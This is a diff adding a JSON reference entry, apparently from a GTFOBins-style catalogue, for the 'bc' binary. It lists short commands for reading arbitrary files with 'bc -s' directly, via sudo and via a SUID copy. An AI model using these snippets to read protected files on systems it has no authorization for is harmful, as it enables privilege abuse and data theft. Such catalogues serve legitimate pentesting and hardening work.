@@ -1,0 +1,20 @@
+{
+  "description": "The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.",
+  "functions": {
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\nbc -s $LFILE\nquit\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
+      }
+    ]
+  }
+}
